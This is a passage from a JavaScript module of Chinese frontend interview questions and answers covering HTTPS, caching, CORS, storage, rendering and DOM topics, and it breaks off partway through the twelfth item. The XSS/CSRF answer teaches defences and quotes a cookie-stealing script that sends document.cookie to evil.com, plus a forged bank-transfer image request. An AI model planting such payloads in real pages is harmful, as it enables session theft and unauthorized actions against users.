// 浏览器与工程化面试题 — 30 题
export const browserEngineeringQuestions = [
  // ========== HTTP/网络 ==========
  {
    id: 'be-001',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'easy',
    tags: ['HTTP', 'HTTPS', '加密'],
    question: 'HTTP 和 HTTPS 的区别？HTTPS 的加密原理是什么？',
    answer: `### 对比

| 特性 | HTTP | HTTPS |
|------|------|-------|
| 端口 | 80 | 443 |
| 加密 | ❌ 明文传输 | ✅ TLS/SSL 加密 |
| 证书 | 不需要 | 需要 CA 证书 |
| 性能 | 快 | 略慢（握手开销）|
| SEO | 无加分 | 搜索引擎优先 |
| 安全性 | 低（可被中间人攻击）| 高 |

### HTTPS 加密原理

HTTPS = HTTP + TLS/SSL，使用**混合加密**：

**1. 非对称加密（握手阶段）**
- 客户端连接服务器
- 服务器返回**证书**（含公钥）
- 客户端验证证书（CA 签名）
- 客户端生成**会话密钥**，用公钥加密发给服务器
- 服务器用私钥解密获得会话密钥

**2. 对称加密（数据传输阶段）**
- 双方使用会话密钥加密通信内容
- 对称加密速度快，适合大量数据

### TLS 握手流程（TLS 1.2）

\`\`\`
Client                          Server
  | --- ClientHello --------------> |
  |     (支持的加密套件、随机数)     |
  |                                 |
  | <--- ServerHello -------------- |
  |     (选择的加密套件、随机数)     |
  | <--- Certificate -------------- |
  |     (服务器证书，含公钥)         |
  | <--- ServerHelloDone ---------- |
  |                                 |
  | --- ClientKeyExchange --------> |
  |     (用公钥加密的会话密钥)       |
  | --- ChangeCipherSpec ---------> |
  | --- Finished -----------------> |
  |                                 |
  | <--- ChangeCipherSpec --------- |
  | <--- Finished ---------------- |
  |                                 |
  | <=== 加密通信开始 =============> |
\`\`\`

### TLS 1.3 改进
- 握手从 2-RTT 减少到 1-RTT
- 更安全的加密算法
- 废弃了不安全的算法

### 为什么不全部用非对称加密
- 非对称加密计算量大、速度慢
- 对称加密快 100-1000 倍
- 所以用非对称加密交换密钥，对称加密传输数据`
  },
  {
    id: 'be-002',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'medium',
    tags: ['HTTP', '请求方法', '状态码'],
    question: 'HTTP 常见请求方法和状态码有哪些？',
    answer: `### 请求方法

| 方法 | 说明 | 幂等 | 安全 |
|------|------|------|------|
| GET | 获取资源 | ✅ | ✅ |
| POST | 创建资源 | ❌ | ❌ |
| PUT | 完整更新资源 | ✅ | ❌ |
| PATCH | 部分更新资源 | ❌ | ❌ |
| DELETE | 删除资源 | ✅ | ❌ |
| HEAD | 获取头信息（无响应体）| ✅ | ✅ |
| OPTIONS | 预检请求（CORS）| ✅ | ✅ |

**幂等**：多次执行结果相同（GET 请求多次结果一致）
**安全**：不修改服务器数据

### GET vs POST

| 特性 | GET | POST |
|------|-----|------|
| 参数位置 | URL query | 请求体 |
| 长度限制 | 浏览器有限制（~2KB）| 无限制 |
| 缓存 | ✅ 可缓存 | ❌ 默认不缓存 |
| 幂等 | ✅ | ❌ |
| 浏览器历史 | ✅ 保留 | ❌ |
| 书签 | ✅ 可收藏 | ❌ |
| 编码 | URL 编码 | 多种（form-data、json）|

### 状态码

**1xx 信息：**
- 100 Continue — 继续发送请求体

**2xx 成功：**
- 200 OK — 请求成功
- 201 Created — 资源创建成功
- 204 No Content — 成功但无返回内容

**3xx 重定向：**
- 301 Moved Permanently — 永久重定向（缓存）
- 302 Found — 临时重定向（不缓存）
- 304 Not Modified — 资源未修改（使用缓存）

**4xx 客户端错误：**
- 400 Bad Request — 请求格式错误
- 401 Unauthorized — 未认证（需要登录）
- 403 Forbidden — 无权限
- 404 Not Found — 资源不存在
- 405 Method Not Allowed — 方法不允许
- 429 Too Many Requests — 请求频率超限

**5xx 服务器错误：**
- 500 Internal Server Error — 服务器内部错误
- 502 Bad Gateway — 网关错误
- 503 Service Unavailable — 服务不可用
- 504 Gateway Timeout — 网关超时

### 301 vs 302
- **301**：永久重定向，浏览器会缓存，下次直接跳转新地址。SEO 权重转移到新 URL
- **302**：临时重定向，每次都请求原地址。SEO 权重不转移

### RESTful API 设计
\`\`\`
GET    /users          # 获取用户列表
GET    /users/:id      # 获取单个用户
POST   /users          # 创建用户
PUT    /users/:id      # 更新用户（全量）
PATCH  /users/:id      # 更新用户（部分）
DELETE /users/:id      # 删除用户
\`\`\``
  },
  {
    id: 'be-003',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'medium',
    tags: ['HTTP', '缓存', '强缓存', '协商缓存'],
    question: '浏览器缓存机制是什么？强缓存和协商缓存的区别？',
    answer: `### 缓存流程

\`\`\`
请求 → 检查强缓存 → 命中？→ 直接使用（不发请求）
                   ↓ 未命中
         检查协商缓存 → 命中？→ 304 使用缓存
                        ↓ 未命中
                      200 返回新资源
\`\`\`

### 强缓存

不发请求，直接从缓存读取。

**HTTP/1.1：Cache-Control（优先）**
\`\`\`
Cache-Control: max-age=3600     # 缓存 3600 秒
Cache-Control: no-cache          # 不直接使用缓存（走协商缓存）
Cache-Control: no-store          # 完全不缓存
Cache-Control: public            # 可被 CDN 等中间缓存
Cache-Control: private           # 只能被浏览器缓存
\`\`\`

**HTTP/1.0：Expires（已过时）**
\`\`\`
Expires: Wed, 09 Aug 2026 00:00:00 GMT  # 绝对过期时间
\`\`\`

### 协商缓存

发请求验证缓存是否有效，有效返回 304。

**方式 1：Last-Modified / If-Modified-Since**

\`\`\`
# 首次响应
Last-Modified: Wed, 09 Aug 2026 00:00:00 GMT

# 再次请求
If-Modified-Since: Wed, 09 Aug 2026 00:00:00 GMT

# 服务器比较：
# 未修改 → 304 Not Modified（不返回响应体）
# 已修改 → 200 + 新资源 + 新 Last-Modified
\`\`\`

**方式 2：ETag / If-None-Match（更精确）**

\`\`\`
# 首次响应
ETag: "abc123"

# 再次请求
If-None-Match: "abc123"

# 服务器比较：
# ETag 相同 → 304
# ETag 不同 → 200 + 新资源
\`\`\`

### ETag vs Last-Modified

| 特性 | Last-Modified | ETag |
|------|---------------|------|
| 精度 | 秒级 | 字节级（哈希）|
| 性能 | 快（时间比较）| 稍慢（计算哈希）|
| 准确性 | 低（1秒内修改无法检测）| 高 |
| 优先级 | 低 | 高 |

### 实际应用

**HTML 文件**：\`Cache-Control: no-cache\`（协商缓存）
**JS/CSS 文件**：\`Cache-Control: max-age=31536000\` + 文件名哈希（强缓存）
**图片等静态资源**：\`Cache-Control: max-age=86400\`（强缓存）

\`\`\`nginx
# Nginx 配置示例
location ~* \\.(js|css)$ {
  add_header Cache-Control "public, max-age=31536000, immutable";
}
location ~* \\.(html)$ {
  add_header Cache-Control "no-cache";
}
\`\`\`

### immutable 关键字
\`immutable\` 告诉浏览器资源永不过期，即使用户刷新也不验证：
\`\`\`
Cache-Control: max-age=31536000, immutable
\`\`\`
配合文件名哈希（如 \`app.a1b2c3.js\`），内容变化时文件名变，自动请求新文件。`
  },
  {
    id: 'be-004',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'medium',
    tags: ['跨域', 'CORS', '同源策略'],
    question: '什么是跨域？有哪些解决跨域的方案？',
    answer: `### 同源策略

浏览器安全策略：**协议、域名、端口**三者完全相同才算同源。不同源的请求默认被浏览器拦截。

### 跨域解决方案

### 1. CORS（最常用）

服务端设置响应头允许跨域：

\`\`\`
# 简单请求
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Credentials: true

# 预检请求响应
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
\`\`\`

**简单请求**条件（同时满足）：
- 方法为 GET/HEAD/POST
- Content-Type 为 text/plain、multipart/form-data、application/x-www-form-urlencoded
- 不含自定义头部

**预检请求**（OPTIONS）：
- 非简单请求先发 OPTIONS 请求询问是否允许
- 浏览器根据响应决定是否发送真实请求

\`\`\`javascript
// Node.js Express 示例
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', 'https://example.com')
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE')
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization')
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200)
  }
  next()
})
\`\`\`

### 2. 代理服务器

\`\`\`
浏览器 → 同源代理服务器 → 目标服务器
\`\`\`

\`\`\`javascript
// Vite 配置
export default {
  server: {
    proxy: {
      '/api': {
        target: 'http://backend.com',
        changeOrigin: true,
        rewrite: path => path.replace(/^\\/api/, '')
      }
    }
  }
}
\`\`\`

### 3. JSONP（已过时）

利用 \`<script>\` 标签不受同源策略限制：

\`\`\`javascript
function handleData(data) { console.log(data) }

const script = document.createElement('script')
script.src = 'https://api.example.com/data?callback=handleData'
document.body.appendChild(script)
// 服务器返回: handleData({ name: 'Tom' })
\`\`\`
- ✅ 兼容老浏览器
- ❌ 只支持 GET、不安全、已过时

### 4. postMessage（跨窗口通信）

\`\`\`javascript
// 父窗口 → iframe
iframe.contentWindow.postMessage('hello', 'https://child.com')

// iframe 接收
window.addEventListener('message', (e) => {
  if (e.origin === 'https://parent.com') {
    console.log(e.data)
  }
})
\`\`\`

### 5. WebSocket

WebSocket 不受同源策略限制：

\`\`\`javascript
const ws = new WebSocket('ws://example.com/socket')
ws.onmessage = (e) => console.log(e.data)
\`\`\`

### 带凭证的跨域
\`\`\`javascript
fetch('https://api.example.com/data', {
  credentials: 'include'  // 携带 Cookie
})
// 服务端必须设置
// Access-Control-Allow-Origin: 具体域名（不能用 *）
// Access-Control-Allow-Credentials: true
\`\`\``
  },
  {
    id: 'be-005',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'medium',
    tags: ['XSS', 'CSRF', '安全'],
    question: '什么是 XSS 和 CSRF？如何防御？',
    answer: `### XSS（跨站脚本攻击）

攻击者在页面中注入恶意脚本，在用户浏览器中执行。

**类型：**

1. **存储型 XSS**：恶意代码存入数据库，所有访问者都受影响
2. **反射型 XSS**：恶意代码在 URL 中，服务器返回到页面
3. **DOM 型 XSS**：纯前端漏洞，不经过服务器

**攻击示例：**
\`\`\`javascript
// 用户评论中注入
<script>fetch('https://evil.com?cookie=' + document.cookie)</script>

// 如果没有转义，其他用户看到评论时脚本执行
\`\`\`

**防御：**

1. **输出转义**：
\`\`\`javascript
function escape(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
}
\`\`\`

2. **CSP（内容安全策略）**：
\`\`\`html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' cdn.example.com">
\`\`\`

3. **HttpOnly Cookie**：
\`\`\`
Set-Cookie: token=abc; HttpOnly; Secure; SameSite=Strict
\`\`\`

4. **使用现代框架**：React/Vue 默认转义

### CSRF（跨站请求伪造）

攻击者诱导用户在已登录的网站上执行非预期操作。

**攻击示例：**
\`\`\`html
<!-- 钓鱼网站 -->
<img src="https://bank.com/transfer?to=hacker&amount=10000">
<!-- 用户已登录 bank.com，浏览器自动携带 Cookie -->
\`\`\`

**防御：**

1. **CSRF Token**：
\`\`\`html
<form action="/transfer" method="POST">
  <input type="hidden" name="_token" value="随机生成的token">
  <input type="text" name="amount">
</form>
\`\`\`

2. **SameSite Cookie**：
\`\`\`
Set-Cookie: token=abc; SameSite=Strict  # 不跨站发送
Set-Cookie: token=abc; SameSite=Lax     # 仅 GET 跨站发送（默认）
\`\`\`

3. **Referer/Origin 校验**：
\`\`\`javascript
const referer = req.headers.referer
if (!isAllowedOrigin(referer)) {
  return res.status(403).send('Forbidden')
}
\`\`\`

### XSS vs CSRF

| 特性 | XSS | CSRF |
|------|-----|------|
| 原理 | 注入脚本执行 | 借用用户身份发请求 |
| 前提 | 网站存在 XSS 漏洞 | 用户已登录目标网站 |
| 防御 | 转义、CSP、HttpOnly | Token、SameSite、Referer |

### 其他安全威胁
- **点击劫持**：iframe 嵌套 → \`X-Frame-Options: DENY\`
- **SQL 注入**：参数化查询
- **中间人攻击**：HTTPS`
  },
  {
    id: 'be-006',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'medium',
    tags: ['Cookie', 'localStorage', 'sessionStorage'],
    question: 'Cookie、localStorage、sessionStorage 的区别？',
    answer: `### 对比

| 特性 | Cookie | localStorage | sessionStorage |
|------|--------|-------------|----------------|
| 大小 | ~4KB | ~5MB | ~5MB |
| 生命周期 | 可设置过期时间 | 永久 | 关闭标签页清除 |
| 请求携带 | ✅ 自动携带 | ❌ | ❌ |
| 作用域 | 域名+路径 | 域名 | 标签页 |
| API | document.cookie | getItem/setItem | getItem/setItem |
| 安全 | HttpOnly/Secure | 无 | 无 |
| 适用 | 认证 Token | 持久化数据 | 临时会话数据 |

### Cookie

\`\`\`javascript
// 设置 Cookie
document.cookie = 'name=Tom; max-age=3600; path=/; Secure; SameSite=Strict'

// 读取（返回所有 cookie 字符串）
console.log(document.cookie) // 'name=Tom; age=25'

// 服务器设置
Set-Cookie: token=abc; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
\`\`\`

**Cookie 属性：**
- \`HttpOnly\`：JS 不可读取（防 XSS）
- \`Secure\`：仅 HTTPS 传输
- \`SameSite=Strict|Lax|None\`：跨站发送策略
- \`Max-Age\` / \`Expires\`：过期时间
- \`Domain\` / \`Path\`：作用范围

### localStorage

\`\`\`javascript
// 存储
localStorage.setItem('user', JSON.stringify({ name: 'Tom' }))

// 读取
const user = JSON.parse(localStorage.getItem('user'))

// 删除
localStorage.removeItem('user')

// 清空所有
localStorage.clear()

// 监听变化（跨标签页通信）
window.addEventListener('storage', (e) => {
  console.log(e.key, e.newValue)
})
\`\`\`

### sessionStorage

\`\`\`javascript
// API 与 localStorage 完全相同
sessionStorage.setItem('temp', 'data')
sessionStorage.getItem('temp')

// 生命周期：标签页关闭后清除
// 同源不同标签页的 sessionStorage 独立
\`\`\`

### 使用场景

**Cookie：**
- 认证 Token（HttpOnly）
- 用户偏好设置（需要服务器读取的）

**localStorage：**
- 用户设置（主题、语言）
- 缓存数据
- 离线数据

**sessionStorage：**
- 表单临时数据
- 单次会话状态
- 页面间传递临时数据

### Token 存储方案

| 方案 | XSS 风险 | CSRF 风险 | 推荐 |
|------|----------|----------|------|
| Cookie (HttpOnly) | 低 | 中 | ✅ 需配合 SameSite |
| localStorage | 高 | 无 | ❌ JS 可读取 |
| 内存变量 | 无 | 无 | ✅ 刷新丢失 |

### 最佳实践
- 认证 Token 存 HttpOnly Cookie
- 用户偏好存 localStorage
- 临时数据存 sessionStorage
- 敏感数据不要存前端`
  },

  // ========== 浏览器渲染原理 ==========
  {
    id: 'be-007',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'hard',
    tags: ['浏览器渲染', '关键渲染路径', 'DOM'],
    question: '从输入 URL 到页面展示发生了什么？',
    answer: `### 完整流程

\`\`\`
1. URL 解析
2. DNS 查询
3. TCP 连接（三次握手）
4. TLS 握手（HTTPS）
5. 发送 HTTP 请求
6. 服务器处理请求并返回响应
7. 浏览器接收响应
8. 浏览器渲染
9. 加载执行 JS/CSS
10. 触发 load 事件
\`\`\`

### 1. URL 解析
\`\`\`
https://www.example.com:443/path?query=1#hash
  │         │           │    │       │     │
  协议       域名         端口  路径    查询   锚点
\`\`\`

### 2. DNS 查询
\`\`\`
浏览器 DNS 缓存 → 操作系统 DNS 缓存 → 路由器 DNS → ISP DNS → 根域名服务器
\`\`\`

### 3. TCP 三次握手
\`\`\`
Client → SYN → Server
Client ← SYN+ACK ← Server
Client → ACK → Server
（连接建立）
\`\`\`

### 4. 浏览器渲染流程

\`\`\`
HTML → DOM 树
              → 渲染树（Render Tree）
CSS  → CSSOM 树

渲染树 → 布局（Layout/Reflow）→ 绘制（Paint）→ 合成（Composite）
\`\`\`

**详细步骤：**

1. **解析 HTML** → 构建 DOM 树
2. **解析 CSS** → 构建 CSSOM 树
3. **合并 DOM 和 CSSOM** → 渲染树（不包含 \`display: none\` 的元素）
4. **布局（Layout/Reflow）** → 计算元素位置和大小
5. **绘制（Paint）** → 将渲染树转为屏幕上的像素
6. **合成（Composite）** → 将各图层合成最终画面

### 5. JS 执行

\`\`\`html
<!-- 阻塞 HTML 解析 -->
<script src="app.js"></script>

<!-- 不阻塞（异步下载，DOMContentLoaded 后执行 -->
<script defer src="app.js"></script>

<!-- 不阻塞（异步下载，下载完立即执行）-->
<script async src="analytics.js"></script>
\`\`\`

### 6. 事件触发

\`\`\`
DOM 解析完成 → DOMContentLoaded
图片等资源加载完成 → load
\`\`\`

### 性能优化点
1. **DNS 预解析**：\`<link rel="dns-prefetch" href="//cdn.example.com">\`
2. **预连接**：\`<link rel="preconnect" href="//cdn.example.com">\`
3. **减少请求**：合并文件、雪碧图
4. **压缩**：Gzip/Brotli
5. **缓存**：强缓存 + 协商缓存
6. **CDN**：就近访问
7. **懒加载**：图片/组件按需加载`
  },
  {
    id: 'be-008',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'hard',
    tags: ['重排', '重绘', '渲染性能'],
    question: '浏览器的重排（Reflow）和重绘（Repaint）是什么？如何优化？',
    answer: `### 概念

**重排（Reflow）**：元素的大小、位置发生变化，浏览器重新计算布局。

**重绘（Repaint）**：元素外观变化（颜色、背景等），但不影响布局，浏览器重新绘制。

\`\`\`
重排一定会触发重绘，重绘不一定会触发重排
\`\`\`

### 触发重排的操作

- 添加/删除可见 DOM 元素
- 元素位置、尺寸变化（width、height、margin、padding）
- 内容变化（文字数量、图片大小）
- 窗口 resize
- 激活 CSS 伪类（:hover）
- 计算 \`offsetWidth\`、\`scrollTop\` 等布局属性
- 设置 \`style\` 属性

### 触发重绘的操作

- color、background、border-color
- box-shadow、text-decoration
- visibility（不触发布局变化）

### 优化策略

**1. 减少 DOM 操作**

\`\`\`javascript
// ❌ 每次操作都触发重排
for (let i = 0; i < 100; i++) {
  el.style.left = i + 'px'
}

// ✅ 使用 transform（只触发合成）
el.style.transform = 'translateX(100px)'

// ✅ 使用 class 替代多次 style 操作
el.className = 'moved' // 一次重排
\`\`\`

**2. 批量 DOM 修改**

\`\`\`javascript
// ❌ 多次读写交替触发强制重排
const width = el.offsetWidth  // 读
el.style.width = width + 10 + 'px'  // 写
const height = el.offsetHeight  // 读（强制重排）
el.style.height = height + 10 + 'px'  // 写

// ✅ 先读后写
const width = el.offsetWidth  // 读
const height = el.offsetHeight  // 读
el.style.width = width + 10 + 'px'  // 写
el.style.height = height + 10 + 'px'  // 写
\`\`\`

**3. 使用 DocumentFragment**

\`\`\`javascript
const fragment = document.createDocumentFragment()
for (let i = 0; i < 100; i++) {
  const li = document.createElement('li')
  li.textContent = \`Item \${i}\`
  fragment.appendChild(li)
}
ul.appendChild(fragment) // 只触发一次重排
\`\`\`

**4. 隐藏 → 修改 → 显示**

\`\`\`javascript
el.style.display = 'none'  // 一次重排
// 大量修改...
el.style.display = 'block'  // 一次重排
\`\`\`

**5. 使用 transform 和 opacity**

\`\`\`css
/* ❌ 触发重排 */
.animate { left: 100px; top: 100px; }

/* ✅ 只触发合成层 */
.animate { transform: translate(100px, 100px); }
\`\`\`

**6. 使用 will-change**

\`\`\`css
.animated-element {
  will-change: transform;  /* 提前创建合成层 */
}
\`\`\`

**7. 使用 requestAnimationFrame**

\`\`\`javascript
function animate() {
  // 在帧开始时执行
  requestAnimationFrame(() => {
    el.style.transform = 'translateX(100px)'
  })
}
\`\`\`

### 强制同步布局（Layout Thrashing）

\`\`\`javascript
// ❌ 读后写交替，导致强制重排
elements.forEach(el => {
  const height = el.offsetHeight  // 读 → 触发重排
  el.style.height = height + 10 + 'px'  // 写 → 使下一次读触发重排
})

// ✅ 分离读写
const heights = elements.map(el => el.offsetHeight)  // 全部读
elements.forEach((el, i) => {
  el.style.height = heights[i] + 10 + 'px'  // 全部写
})
\`\`\`

### 只读属性会触发重排
\`offsetWidth\`、\`offsetHeight\`、\`clientWidth\`、\`scrollTop\`、\`getComputedStyle()\` 等会**强制浏览器执行待处理的布局变更**，应尽量减少调用。`
  },
  {
    id: 'be-009',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'medium',
    tags: ['事件模型', '冒泡', '捕获', '事件委托'],
    question: '浏览器的事件模型是什么？事件委托的原理？',
    answer: `### 事件流三个阶段

\`\`\`
1. 捕获阶段（Capture）：从 window → 目标元素的祖先
2. 目标阶段（Target）：到达目标元素
3. 冒泡阶段（Bubble）：从目标元素 → window
\`\`\`

\`\`\`javascript
// 第三个参数：true = 捕获阶段监听，false/默认 = 冒泡阶段监听
element.addEventListener('click', handler, false) // 冒泡
element.addEventListener('click', handler, true)  // 捕获

// stopPropagation：阻止事件传播
element.addEventListener('click', (e) => {
  e.stopPropagation() // 阻止冒泡
})

// stopImmediatePropagation：阻止同元素上其他监听器执行
element.addEventListener('click', (e) => {
  e.stopImmediatePropagation()
})
\`\`\`

### 事件委托

利用事件冒泡，在父元素上统一处理子元素的事件。

\`\`\`javascript
// ❌ 为每个 li 绑定事件
document.querySelectorAll('li').forEach(li => {
  li.addEventListener('click', handleClick)
})

// ✅ 事件委托：在父元素上绑定一次
document.querySelector('ul').addEventListener('click', (e) => {
  if (e.target.tagName === 'LI') {
    console.log(e.target.textContent)
  }
})
\`\`\`

### 事件委托优势

1. **减少事件监听器数量**，节省内存
2. **动态元素自动处理**：后添加的 li 也能响应点击
3. **方便管理**：统一在一个地方处理

### 事件委托 + data 属性

\`\`\`html
<div id="toolbar">
  <button data-action="save">保存</button>
  <button data-action="delete">删除</button>
  <button data-action="cancel">取消</button>
</div>
\`\`\`

\`\`\`javascript
document.getElementById('toolbar').addEventListener('click', (e) => {
  const action = e.target.closest('[data-action]')?.dataset.action
  if (!action) return
  
  switch (action) {
    case 'save': saveData(); break
    case 'delete': deleteData(); break
    case 'cancel': cancelAction(); break
  }
})
\`\`\`

### closest 方法
\`closest()\` 从当前元素向上查找匹配的祖先（包括自身），非常适合事件委托：
\`\`\`javascript
// 点击按钮内的 span 时也能找到 button
button.addEventListener('click', (e) => {
  const btn = e.target.closest('button')
  if (btn) handleClick(btn)
})
\`\`\`

### 不适合事件委托的事件
- \`focus\` / \`blur\`（不冒泡，可用 \`focusin\` / \`focusout\` 替代）
- \`mouseenter\` / \`mouseleave\`（不冒泡，可用 \`mouseover\` / \`mouseout\` 替代）
- \`load\` / \`unload\` / \`error\`

### 事件循环与事件
点击事件在**宏任务**中执行。如果事件处理函数中有异步操作，注意事件可能在异步操作完成前被再次触发。`
  },
  {
    id: 'be-010',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'medium',
    tags: ['DOM', '操作', '性能'],
    question: '什么是 DOM？常见 DOM 操作有哪些？',
    answer: `### DOM（Document Object Model）

DOM 是 HTML/XML 文档的编程接口，将文档表示为树形结构，JavaScript 可以通过 DOM API 操作页面内容。

\`\`\`
document
  └── html
       ├── head
       │    ├── title
       │    └── meta
       └── body
            ├── div
            │    └── p
            └── script
\`\`\`

### 获取元素

\`\`\`javascript
// 现代 API
document.querySelector('#id')        // CSS 选择器，返回第一个
document.querySelectorAll('.class')  // 返回 NodeList

// 传统 API
document.getElementById('id')
document.getElementsByClassName('class')  // HTMLCollection（动态）
document.getElementsByTagName('div')      // HTMLCollection（动态）
\`\`\`

### 创建和添加

\`\`\`javascript
// 创建
const div = document.createElement('div')
div.textContent = 'Hello'
div.className = 'box'
div.setAttribute('data-id', '1')

// 添加
document.body.appendChild(div)           // 追加到末尾
document.body.insertBefore(div, refEl)   // 在指定元素前插入
document.body.append(div, 'text')        // 支持多参数和文本

// 现代 API
parentEl.prepend(newEl)    // 开头插入
parentEl.before(newEl)     // 元素前插入
parentEl.after(newEl)      // 元素后插入
\`\`\`

### 删除和替换

\`\`\`javascript
// 删除
el.remove()                      // 现代 API
parentEl.removeChild(el)         // 传统 API

// 替换
parentEl.replaceChild(newEl, oldEl)
oldEl.replaceWith(newEl)         // 现代 API
\`\`\`

### 修改内容和属性

\`\`\`javascript
// 内容
el.textContent = '纯文本'         // 安全（自动转义）
el.innerHTML = '<b>HTML</b>'     // 可解析 HTML（注意 XSS）
el.innerText = '可见文本'         // 触发重排

// 属性
el.id = 'myId'
el.className = 'box active'
el.classList.add('active')        // 添加 class
el.classList.remove('active')     // 移除 class
el.classList.toggle('active')     // 切换 class
el.classList.contains('active')   // 是否包含

// dataset
el.dataset.userId = '123'        // data-user-id="123"

// 样式
el.style.color = 'red'
el.style.setProperty('--custom', 'value')
\`\`\`

### 遍历

\`\`\`javascript
el.parentNode        // 父节点
el.parentElement     // 父元素节点
el.children          // 子元素集合
el.firstChild        // 第一个子节点（可能是文本节点）
el.firstElementChild // 第一个元素子节点
el.nextElementSibling // 下一个兄弟元素
\`\`\`

### 性能优化

**1. 使用 DocumentFragment 批量操作**
\`\`\`javascript
const fragment = document.createDocumentFragment()
items.forEach(item => {
  const li = document.createElement('li')
  li.textContent = item
  fragment.appendChild(li)
})
ul.appendChild(fragment) // 只触发一次重排
\`\`\`

**2. cloneNode 替代 createElement**
\`\`\`javascript
const template = document.createElement('div')
template.className = 'item'
template.innerHTML = '<span></span>'

const clone = template.cloneNode(true) // 深拷贝
clone.querySelector('span').textContent = 'Hello'
\`\`\`

**3. innerHTML vs createElement**
\`innerHTML\` 解析 HTML 字符串，大量元素时比 createElement 快，但有 XSS 风险。

### MutationObserver（监听 DOM 变化）
\`\`\`javascript
const observer = new MutationObserver((mutations) => {
  mutations.forEach(m => console.log(m.type))
})
observer.observe(el, { childList: true, subtree: true, attributes: true })
\`\`\``
  },
  {
    id: 'be-011',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'medium',
    tags: ['存储', 'IndexedDB', '离线'],
    question: '前端数据存储方案有哪些？IndexedDB 的优势是什么？',
    answer: `### 存储方案对比

| 方案 | 容量 | 类型 | 异步 | 适用场景 |
|------|------|------|------|----------|
| Cookie | ~4KB | 字符串 | ❌ | 认证凭证 |
| localStorage | ~5MB | 字符串 | ❌ | 简单 KV |
| sessionStorage | ~5MB | 字符串 | ❌ | 会话数据 |
| IndexedDB | ~50MB+ | 结构化 | ✅ | 大量数据 |
| Cache API | ~50MB+ | Response | ✅ | PWA 离线 |

### IndexedDB

浏览器端的 NoSQL 数据库，支持事务、索引、游标。

\`\`\`javascript
// 打开数据库
const request = indexedDB.open('MyDB', 1)

request.onupgradeneeded = (e) => {
  const db = e.target.result
  // 创建对象仓库（表）
  if (!db.objectStoreNames.contains('users')) {
    const store = db.createObjectStore('users', { keyPath: 'id' })
    store.createIndex('name', 'name', { unique: false })
  }
}

request.onsuccess = (e) => {
  const db = e.target.result
  // 添加数据
  const tx = db.transaction('users', 'readwrite')
  const store = tx.objectStore('users')
  store.add({ id: 1, name: 'Tom', age: 25 })
  
  // 读取数据
  store.get(1).onsuccess = (e) => {
    console.log(e.target.result) // { id: 1, name: 'Tom', age: 25 }
  }
  
  // 遍历
  store.openCursor().onsuccess = (e) => {
    const cursor = e.target.result
    if (cursor) {
      console.log(cursor.value)
      cursor.continue()
    }
  }
}
\`\`\`

### IndexedDB 优势

1. **大容量**：通常 50MB-1GB（浏览器实现）
2. **结构化数据**：支持对象、数组、Blob
3. **异步 API**：不阻塞主线程
4. **事务支持**：保证数据一致性
5. **索引**：高效查询
6. **同源策略**：安全隔离

### 封装 IndexedDB（Promise 版）

\`\`\`javascript
function openDB(name, version, upgradeCallback) {
  return new Promise((resolve, reject) => {
    const req = indexedDB.open(name, version)
    req.onupgradeneeded = (e) => upgradeCallback(e.target.result)
    req.onsuccess = (e) => resolve(e.target.result)
    req.onerror = (e) => reject(e.target.error)
  })
}

function put(db, store, data) {
  return new Promise((resolve, reject) => {
    const tx = db.transaction(store, 'readwrite')
    tx.objectStore(store).put(data)
    tx.oncomplete = () => resolve(data)
    tx.onerror = () => reject(tx.error)
  })
}
\`\`\`

### Cache API（PWA 离线）

\`\`\`javascript
// 缓存资源
const cache = await caches.open('v1')
await cache.addAll([
  '/',
  '/styles.css',
  '/app.js'
])

// 从缓存读取
const cached = await caches.match('/styles.css')

// Service Worker 中拦截请求
self.addEventListener('fetch', (e) => {
  e.respondWith(
    caches.match(e.request).then(cached => 
      cached || fetch(e.request)
    )
  )
})
\`\`\`

### 选择建议
- **简单 KV** → localStorage
- **大量结构化数据** → IndexedDB
- **离线资源缓存** → Cache API
- **认证 Token** → \`Cookie (HttpOnly)\``
  },

  // ========== 性能优化 ==========
  {
    id: 'be-012',
    category: 'browser-engineering',
    module: 'browser',
    difficulty: 'medium',
    tags: ['性能优化', '加载', '首屏'],
    question: '前端性能优化有哪些常见手段？',
    answer: `### 加载优化

**1. 减少请求**
- 合并文件（JS/CSS 打包）
- 雪碧图 → CSS 图标/字体图标 → SVG sprite
- 内联关键 CSS（Critical CSS）

**2. 压缩**
- Gzip / Brotli 压缩
- 图片压缩（WebP > JPEG, AVIF 更优）
- 代码压缩（Terser、cssnano）

**3. 缓存**
- 强缓存 + 协商缓存
- 文件名哈希（contenthash）
- Service Worker 离线缓存

**4. 按需加载**
- 路由懒加载
- 组件懒加载
- 图片懒加载
- 动态 import()

\`\`\`javascript
// 路由懒加载
const Home = lazy(() => import('./Home'))

// 图片懒加载
<img loading="lazy" src="image.jpg" />

// 动态导入
const module = await import('./heavy-module')
\`\`\`

**5. 预加载**
\`\`\`html
<!-- 预加载关键资源 -->
<link rel="preload" href="/critical.js" as="script">
<link rel="preload" href="/font.woff2" as="font" crossorigin>

<!-- 预连接 -->
<link rel="preconnect" href="https://cdn.example.com">
<link rel="dns-prefetch" href="https://cdn.example.com">

<!-- 预获取（空闲时） -->
<link rel="prefetch" href="/next-page.js">
\`\`\`

### 渲染优化

**1. CSS 优化**
- 关键 CSS 内联到 \`<head>\`
- 非关键 CSS 异步加载
- 避免使用 \`@import\`（阻塞渲染）

**2. JS 优化**
